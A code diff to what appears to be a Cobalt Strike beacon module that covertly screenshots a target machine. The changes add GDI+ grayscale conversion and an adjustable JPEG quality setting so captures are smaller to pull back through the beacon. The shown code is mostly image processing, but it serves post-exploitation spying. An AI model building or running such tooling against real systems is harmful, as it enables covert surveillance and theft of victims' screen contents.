@@ -248,12 +248,22 @@ typedef VOID(WINAPI* PFN_GdiplusShutdown)(ULONG_PTR);
 typedef Status(WINAPI* PFN_GdipCreateBitmapFromHBITMAP)(HBITMAP, HPALETTE, GpBitmap**);
 typedef Status(WINAPI* PFN_GdipDisposeImage)(GpImage*);
 typedef Status(WINAPI* PFN_GdipSaveImageToStream)(GpImage*, IStream*, const CLSID*, const EncoderParameters*);
+typedef Status(WINAPI* PFN_GdipBitmapLockBits)(GpBitmap*, const GpRect*, UINT, PixelFormat, BitmapData*);
+typedef Status(WINAPI* PFN_GdipBitmapUnlockBits)(GpBitmap*, BitmapData*);
+typedef Status(WINAPI* PFN_GdipGetImageWidth)(GpImage*, UINT*);
+typedef Status(WINAPI* PFN_GdipGetImageHeight)(GpImage*, UINT*);
+typedef Status(WINAPI* PFN_GdipCloneBitmapAreaI)(INT, INT, INT, INT, PixelFormat, GpBitmap*, GpBitmap**);
 
 static PFN_GdiplusStartup pGdiplusStartup = NULL;
 static PFN_GdiplusShutdown pGdiplusShutdown = NULL;
 static PFN_GdipCreateBitmapFromHBITMAP pGdipCreateBitmapFromHBITMAP = NULL;
 static PFN_GdipDisposeImage pGdipDisposeImage = NULL;
 static PFN_GdipSaveImageToStream pGdipSaveImageToStream = NULL;
+static PFN_GdipBitmapLockBits pGdipBitmapLockBits = NULL;
+static PFN_GdipBitmapUnlockBits pGdipBitmapUnlockBits = NULL;
+static PFN_GdipGetImageWidth pGdipGetImageWidth = NULL;
+static PFN_GdipGetImageHeight pGdipGetImageHeight = NULL;
+static PFN_GdipCloneBitmapAreaI pGdipCloneBitmapAreaI = NULL;
 
 void ResolveGdiPlus()
 {
@@ -264,6 +274,11 @@ void ResolveGdiPlus()
     pGdipCreateBitmapFromHBITMAP = (PFN_GdipCreateBitmapFromHBITMAP)GetProcAddress(hGdiPlus, "GdipCreateBitmapFromHBITMAP");
     pGdipDisposeImage = (PFN_GdipDisposeImage)GetProcAddress(hGdiPlus, "GdipDisposeImage");
     pGdipSaveImageToStream = (PFN_GdipSaveImageToStream)GetProcAddress(hGdiPlus, "GdipSaveImageToStream");
+    pGdipBitmapLockBits = (PFN_GdipBitmapLockBits)GetProcAddress(hGdiPlus, "GdipBitmapLockBits");
+    pGdipBitmapUnlockBits = (PFN_GdipBitmapUnlockBits)GetProcAddress(hGdiPlus, "GdipBitmapUnlockBits");
+    pGdipGetImageWidth = (PFN_GdipGetImageWidth)GetProcAddress(hGdiPlus, "GdipGetImageWidth");
+    pGdipGetImageHeight = (PFN_GdipGetImageHeight)GetProcAddress(hGdiPlus, "GdipGetImageHeight");
+    pGdipCloneBitmapAreaI = (PFN_GdipCloneBitmapAreaI)GetProcAddress(hGdiPlus, "GdipCloneBitmapAreaI");
 }
 
 //-------------------------------------------------------------
@@ -361,7 +376,7 @@ void downloadFile(char* fileName, int downloadFileNameLength, char* returnData, 
 // Convert the given HBITMAP to a JPEG in memory using GDI+
 // credit: https://github.com/WKL-Sec/HiddenDesktop/blob/14252f58e3f5379301f0d6334f92f8b96f321a16/client/scmain.c#L125
 //-------------------------------------------------------------
-BOOL BitmapToJpeg(HBITMAP hBitmap, int quality, BYTE** pJpegData, DWORD* pJpegSize)
+BOOL BitmapToJpeg(HBITMAP hBitmap, int quality, int grayscale, BYTE** pJpegData, DWORD* pJpegSize)
 {
     ResolveGdiPlus();
     if (!pGdiplusStartup || !pGdiplusShutdown || !pGdipCreateBitmapFromHBITMAP ||
@@ -389,6 +404,60 @@ BOOL BitmapToJpeg(HBITMAP hBitmap, int quality, BYTE** pJpegData, DWORD* pJpegSi
         BeaconPrintf(CALLBACK_ERROR, "[DEBUG] GdipCreateBitmapFromHBITMAP failed: %d", stat);
         pGdiplusShutdown(gdiplusToken);
         return FALSE;
+    }
+
+    if (grayscale) {
+        UINT width = 0, height = 0;
+        if (pGdipGetImageWidth && pGdipGetImageHeight) {
+            Status wStatus = pGdipGetImageWidth((GpImage*)pGpBitmap, &width);
+            Status hStatus = pGdipGetImageHeight((GpImage*)pGpBitmap, &height);
+            if (wStatus != Ok || hStatus != Ok) {
+                BeaconPrintf(CALLBACK_ERROR, "[DEBUG] Failed to get image dimensions: wStatus=%d hStatus=%d", wStatus, hStatus);
+            }
+        } else {
+            BeaconPrintf(CALLBACK_ERROR, "[DEBUG] GDI+ dimension helpers not resolved");
+        }
+
+        if (width && height && pGdipBitmapLockBits && pGdipBitmapUnlockBits) {
+            GpBitmap* pTarget = pGpBitmap;
+            if (pGdipCloneBitmapAreaI) {
+                GpBitmap* pCloned = NULL;
+                Status cloneStatus = pGdipCloneBitmapAreaI(0, 0, (INT)width, (INT)height, PixelFormat24bppRGB, pGpBitmap, &pCloned);
+                if (cloneStatus == Ok && pCloned) {
+                    pTarget = pCloned;
+                } else {
+                    BeaconPrintf(CALLBACK_ERROR, "[DEBUG] GdipCloneBitmapAreaI failed: %d", cloneStatus);
+                }
+            }
+
+            GpRect rect = { 0, 0, (INT)width, (INT)height };
+            BitmapData data;
+            Status lockStatus = pGdipBitmapLockBits(pTarget, &rect, ImageLockModeWrite | ImageLockModeRead, PixelFormat24bppRGB, &data);
+            if (lockStatus == Ok) {
+                BYTE* scan0 = (BYTE*)data.Scan0;
+                for (UINT y = 0; y < height; y++) {
+                    BYTE* row = scan0 + y * data.Stride;
+                    for (UINT x = 0; x < width; x++) {
+                        BYTE* px = row + x * 3;
+                        BYTE b = px[0], g = px[1], r = px[2];
+                        BYTE gray = (BYTE)((r * 77 + g * 150 + b * 29) >> 8);
+                        px[0] = gray;
+                        px[1] = gray;
+                        px[2] = gray;
+                    }
+                }
+                pGdipBitmapUnlockBits(pTarget, &data);
+                if (pTarget != pGpBitmap) {
+                    pGdipDisposeImage((GpImage*)pGpBitmap);
+                    pGpBitmap = pTarget;
+                }
+            } else {
+                BeaconPrintf(CALLBACK_ERROR, "[DEBUG] GdipBitmapLockBits failed: %d", lockStatus);
+                if (pTarget != pGpBitmap) {
+                    pGdipDisposeImage((GpImage*)pTarget);
+                }
+            }
+        }
     }
     IStream* pStream = NULL;
     if (CreateStreamOnHGlobal(NULL, TRUE, &pStream) != S_OK) {
@@ -462,15 +531,15 @@ BOOL BitmapToJpeg(HBITMAP hBitmap, int quality, BYTE** pJpegData, DWORD* pJpegSi
 //-------------------------------------------------------------
 // Save (or download) the given HBITMAP as a JPEG file with the provided filename
 //-------------------------------------------------------------
-BOOL SaveHBITMAPToFile(HBITMAP hBitmap, LPCTSTR lpszFileName, int savemethod)
+BOOL SaveHBITMAPToFile(HBITMAP hBitmap, LPCTSTR lpszFileName, int savemethod, int grayscale, int quality)
 {
     ResolveAPIs();
 
     BYTE* jpegData = NULL;
     DWORD jpegSize = 0;
-    int quality = 90;  // adjust JPEG quality (0–100) as desired
 
-    if (!BitmapToJpeg(hBitmap, quality, &jpegData, &jpegSize)) {
+
+    if (!BitmapToJpeg(hBitmap, quality, grayscale, &jpegData, &jpegSize)) {
         BeaconPrintf(CALLBACK_ERROR, "[DEBUG] Failed to convert bitmap to JPEG");
         return FALSE;
     }
@@ -701,9 +770,13 @@ void go(char* buff, int len)
     char* filename = BeaconDataExtract(&parser, NULL);
     int savemethod = BeaconDataInt(&parser);
     int pid = BeaconDataInt(&parser);
+    int grayscale = BeaconDataInt(&parser);
+    int quality = BeaconDataInt(&parser);
+    if (quality < 0) quality = 0;
+    if (quality > 100) quality = 100;
 
     if (debug)
-        BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] go() called with filename: %s, savemethod: %d, pid: %d, debug: %d", filename, savemethod, pid, debug);
+        BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] go() called with filename: %s, savemethod: %d, pid: %d, grayscale: %d, quality: %d, debug: %d", filename, savemethod, pid, grayscale, quality, debug);
     
     BOOL dpi = SetProcessDPIAware(); // Set DPI awareness to fix incomplete screenshots
     
@@ -801,7 +874,7 @@ void go(char* buff, int len)
     if (hBitmap) {
         if (debug)
             BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Captured bitmap successfully; saving/downloading as %s", filename);
-        if (!SaveHBITMAPToFile(hBitmap, filename, savemethod))
+        if (!SaveHBITMAPToFile(hBitmap, filename, savemethod, grayscale, quality))
             BeaconPrintf(CALLBACK_ERROR, "[DEBUG] Failed to save JPEG");
         else
             BeaconPrintf(CALLBACK_OUTPUT, "Screenshot saved/downloaded successfully", filename);
